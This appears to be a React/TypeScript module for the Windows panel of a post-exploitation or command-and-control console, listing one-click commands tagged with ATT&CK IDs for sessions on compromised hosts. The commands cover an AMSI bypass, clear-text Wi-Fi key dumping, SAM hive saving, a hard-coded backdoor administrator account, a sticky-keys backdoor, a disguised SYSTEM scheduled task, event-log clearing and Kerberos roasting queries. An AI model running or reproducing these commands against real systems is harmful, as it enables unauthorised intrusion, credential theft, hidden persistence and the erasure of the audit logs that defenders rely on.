import OSPanel from './OSPanel'
import type { OSConfig, Category } from './OSPanel'
import type { Session } from '../types'

const MODULES: Category[] = [
  {
    id: 'recon', icon: '🔍', label: 'RECON', atkId: 'TA0007',
    cmds: [
      { icon: '👤', label: 'whoami /all',         cmd: 'whoami /all',                                        tag: 'T1033' },
      { icon: '💻', label: 'systeminfo',           cmd: 'systeminfo',                                         tag: 'T1082' },
      { icon: '🔧', label: 'OS / Patches',         cmd: 'wmic os get Caption,Version,BuildNumber /value && wmic qfe list brief', tag: 'T1082' },
      { icon: '👥', label: 'Local Users',          cmd: 'net user',                                           tag: 'T1087' },
      { icon: '🔑', label: 'Admins',               cmd: 'net localgroup administrators',                      tag: 'T1069' },
      { icon: '📋', label: 'Processes',            cmd: 'tasklist /v',                                        tag: 'T1057' },
      { icon: '⚙️', label: 'Running Services',     cmd: 'sc query type= all state= running',                  tag: 'T1007' },
      { icon: '📦', label: 'Installed Software',   cmd: 'wmic product get Name,Version /format:csv',         tag: 'T1518' },
      { icon: '🔒', label: 'AV / EDR',             cmd: 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /value', tag: 'T1518' },
      { icon: '🔌', label: 'Autorun Keys',         cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', tag: 'T1547' },
      { icon: '🕐', label: 'Scheduled Tasks',      cmd: 'schtasks /query /fo list /v',                        tag: 'T1053' },
      { icon: '📝', label: 'Event Log (Security)', cmd: 'wevtutil qe Security /c:10 /f:text /rd:true',       tag: 'T1005' },
    ],
  },
  {
    id: 'privesc', icon: '⬆️', label: 'PRIV ESC', atkId: 'TA0004',
    cmds: [
      { icon: '🎭', label: 'Privileges',            cmd: 'whoami /priv',                                       tag: 'T1134' },
      { icon: '🔑', label: 'Token / Groups',        cmd: 'whoami /groups /fo list',                            tag: 'T1134' },
      { icon: '📂', label: 'Unquoted Svc Paths',    cmd: 'wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv "\\"', tag: 'T1574' },
      { icon: '🔧', label: 'AlwaysInstallElev',     cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul', tag: 'T1548' },
      { icon: '🛡️', label: 'UAC Level',            cmd: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA', tag: 'T1548' },
      { icon: '🔐', label: 'PS Execution Policy',   cmd: 'powershell -c "Get-ExecutionPolicy -List"',          tag: 'T1059' },
      { icon: '💉', label: 'AMSI Bypass (test)',    cmd: 'powershell -c "[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true); Write-Output amsi-bypassed"', tag: 'T1562' },
      { icon: '🎪', label: 'SeImpersonate (Potato)', cmd: 'whoami /priv | findstr SeImpersonatePrivilege',     tag: 'T1134' },
      { icon: '📁', label: 'Writable Svc Dirs',     cmd: 'for /f "tokens=2 delims==" %a in (\'wmic service get pathname /value ^| findstr PathName\') do @icacls "%a" 2>nul | findstr /i "everyone\\|users\\|authenticated" && echo WRITABLE: %a', tag: 'T1574' },
    ],
  },
  {
    id: 'creds', icon: '🔑', label: 'CREDENTIALS', atkId: 'TA0006',
    cmds: [
      { icon: '📋', label: 'Stored Creds (cmdkey)', cmd: 'cmdkey /list',                                       tag: 'T1552' },
      { icon: '📎', label: 'Clipboard',             cmd: 'powershell -c "Get-Clipboard"',                     tag: 'T1115' },
      { icon: '🌐', label: 'WiFi Passwords',        cmd: 'for /f "skip=9 tokens=1,2 delims=:" %i in (\'netsh wlan show profiles\') do @if "%j" NEQ "" (echo Profile: %j & netsh wlan show profile "%j" key=clear | findstr "Key Content")', tag: 'T1552' },
      { icon: '🦊', label: 'Firefox Profiles',      cmd: 'dir /s /b C:\\Users\\*\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*logins.json 2>nul', tag: 'T1555' },
      { icon: '🌐', label: 'Chrome Login Data',     cmd: 'dir /s /b C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*Login Data 2>nul', tag: 'T1555' },
      { icon: '🔑', label: 'DPAPI Blobs',           cmd: 'dir /s /b C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\* 2>nul', tag: 'T1555' },
      { icon: '📋', label: 'PowerShell History',    cmd: 'type C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul', tag: 'T1552' },
      { icon: '💀', label: 'SAM Hive (needs SYS)',  cmd: 'reg save HKLM\\SAM C:\\Windows\\Temp\\SAM.hive /y 2>nul && echo saved || echo needs-SYSTEM', tag: 'T1003' },
      { icon: '🕵️', label: 'LSASS PID',            cmd: 'tasklist | findstr lsass',                           tag: 'T1003' },
    ],
  },
  {
    id: 'network', icon: '🌐', label: 'NETWORK', atkId: 'TA0007',
    cmds: [
      { icon: '🌐', label: 'IP Config',             cmd: 'ipconfig /all',                                      tag: 'T1016' },
      { icon: '🗺️', label: 'ARP Table',            cmd: 'arp -a',                                             tag: 'T1016' },
      { icon: '🔌', label: 'Open Ports',            cmd: 'netstat -ano',                                       tag: 'T1049' },
      { icon: '🛤️', label: 'Routes',               cmd: 'route print',                                        tag: 'T1016' },
      { icon: '🌍', label: 'DNS Cache',             cmd: 'ipconfig /displaydns',                               tag: 'T1016' },
      { icon: '📁', label: 'SMB Shares',            cmd: 'net share && net view /all 2>nul',                   tag: 'T1135' },
      { icon: '🔥', label: 'Firewall Rules',        cmd: 'netsh advfirewall firewall show rule name=all',      tag: 'T1562' },
      { icon: '🏠', label: 'Hosts File',            cmd: 'type C:\\Windows\\System32\\drivers\\etc\\hosts',    tag: 'T1016' },
    ],
  },
  {
    id: 'persist', icon: '🔒', label: 'PERSISTENCE', atkId: 'TA0003',
    cmds: [
      { icon: '📝', label: 'Run Keys',              cmd: 'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run && reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', tag: 'T1547' },
      { icon: '🕐', label: 'Sched Tasks',           cmd: 'schtasks /query /fo list /v | findstr "Task Name:\\|Status:\\|Run As"', tag: 'T1053' },
      { icon: '⚙️', label: 'New Sched Task',        cmd: 'schtasks /create /tn "WindowsUpdater" /tr "C:\\Windows\\Temp\\update.exe" /sc onlogon /ru System /f 2>nul && echo created', tag: 'T1053' },
      { icon: '👤', label: 'Add Backdoor User',     cmd: 'net user backd00r P@ssw0rd123! /add && net localgroup administrators backd00r /add',  tag: 'T1136' },
      { icon: '🔑', label: 'Sticky Keys Backdoor',  cmd: 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f', tag: 'T1546' },
      { icon: '🗑️', label: 'Clear Event Logs',     cmd: 'wevtutil cl System & wevtutil cl Security & wevtutil cl Application & echo cleared', tag: 'T1070' },
    ],
  },
  {
    id: 'ad', icon: '🏰', label: 'ACTIVE DIRECTORY', atkId: 'TA0006',
    cmds: [
      { icon: '🏰', label: 'Domain Info',           cmd: 'nltest /domain_trusts 2>nul && net view /domain 2>nul', tag: 'T1482' },
      { icon: '👑', label: 'Domain Admins',         cmd: 'net group "Domain Admins" /domain 2>nul',           tag: 'T1069' },
      { icon: '🖥️', label: 'Domain Controllers',   cmd: 'nltest /dclist: 2>nul',                             tag: 'T1018' },
      { icon: '🎫', label: 'Kerberoast SPNs',       cmd: 'powershell -c "setspn -Q */*"',                     tag: 'T1558' },
      { icon: '🔓', label: 'AS-REP Roastable',      cmd: 'powershell -c "([adsisearcher]\'(userAccountControl:1.2.840.113556.1.4.803:=4194304)\').FindAll().Properties.samaccountname"', tag: 'T1558' },
      { icon: '📋', label: 'GPO Result',            cmd: 'gpresult /R 2>nul',                                 tag: 'T1615' },
      { icon: '🗂️', label: 'ADCS Certs',           cmd: 'certutil -CAInfo 2>nul',                            tag: 'T1649' },
    ],
  },
]

function joinWin(base: string, name: string) { return base.replace(/[/\\]+$/, '') + '\\' + name }
function parentWin(p: string) {
  const t = p.replace(/[/\\]+$/, '')
  const i = Math.max(t.lastIndexOf('\\'), t.lastIndexOf('/'))
  return i <= 2 ? t.slice(0, 3) : t.slice(0, i)
}

const CONFIG: OSConfig = {
  name:       'Windows',
  icon:       '🪟',
  prompt:     'C:\\>',
  filter:     (s: Session) => s.os?.toLowerCase().includes('windows'),
  modules:    MODULES,
  defaultFs:  'C:\\',
  joinPath:   joinWin,
  parentPath: parentWin,
  quickCmds: [
    { icon: '👤', label: 'whoami /all',   cmd: 'whoami /all' },
    { icon: '💻', label: 'systeminfo',    cmd: 'systeminfo' },
    { icon: '📋', label: 'Processes',     cmd: 'tasklist /v' },
    { icon: '🌐', label: 'IP Config',     cmd: 'ipconfig /all' },
    { icon: '🔑', label: 'Privileges',    cmd: 'whoami /priv' },
    { icon: '👥', label: 'Local Users',   cmd: 'net user' },
    { icon: '🔒', label: 'AV / EDR',      cmd: 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /value' },
    { icon: '📂', label: 'Dir C:\\Users', cmd: 'dir C:\\Users' },
  ],
}

interface Props { onOpenTerminal: (id: string, name?: string) => void }
export default function Windows({ onOpenTerminal }: Props) {
  return <OSPanel config={CONFIG} onOpenTerminal={onOpenTerminal} />
}
